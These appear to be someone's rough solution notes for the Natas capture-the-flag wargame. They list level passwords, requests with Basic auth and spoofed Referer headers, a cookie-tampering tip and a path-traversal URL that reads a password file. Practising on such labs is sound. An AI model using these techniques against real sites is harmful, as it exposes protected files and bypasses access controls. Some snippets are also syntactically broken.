natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
<script>var wechallinfo = { "level": "natas2", "pass": "h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7" };</script></head>
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm


const headers = new Headers();
headers.append("Authorization", "Basic bmF0YXMzOkc2Y3RiTUo1TmI0Y2JGd2hwTVBTdnhHSGhRN0k2VzhR");
const myInit = {
  method: "GET",
  headers: headers,
  // mode: "cors",
  // cache: "default",
};
const myRequest = new Request("http://natas4.natas.labs.overthewire.org/", myInit);
const result = fetch(myRequest);

const myContentType = myRequest.headers.get("Content-Type"); // returns 'image/jpeg'

fetch("http://natas4.natas.labs.overthewire.org/", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "authorization": "Basic bmF0YXMzOkc2Y3RiTUo1TmI0Y2JGd2hwTVBTdnhHSGhRN0k2VzhR",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "upgrade-insecure-requests": "1",
    ""
  },
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": null,
  "method": "GET",
  "mode": "no-cors",
  "credentials": "include"
}).then(result => console.log(result));



fetch("http://natas4.natas.labs.overthewire.org/", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9",
    "authorization": "Basic bmF0YXM0OnRLT2NKSWJ6TTRsVHM4aGJDbXpuNVpyNDQzNGZHWlFt",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "upgrade-insecure-requests": "1",
    "referer": "http://natas5.natas.labs.overthewire.org/"
  },
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": null,
  "method": "GET",
  "mode": "cors",
  "credentials": "include"
}).then(result => console.log(result.text()));

curl 'http://natas4.natas.labs.overthewire.org/' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Authorization: Basic bmF0YXM0OnRLT2NKSWJ6TTRsVHM4aGJDbXpuNVpyNDQzNGZHWlFt' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36' \
  -H 'Referer: http://natas5.natas.labs.overthewire.org/'
  --compressed \
  --insecure

natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

change cookie for "is logged in"
natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

find secret in source code. Browse to linked file
natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

local file inclusion
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

http://natas8.natas.labs.overthewire.org/
http://natas8.natas.labs.overthewire.org/index-source.html
https://replit.com/@BenHunter2/GraveConsciousRule#main.php
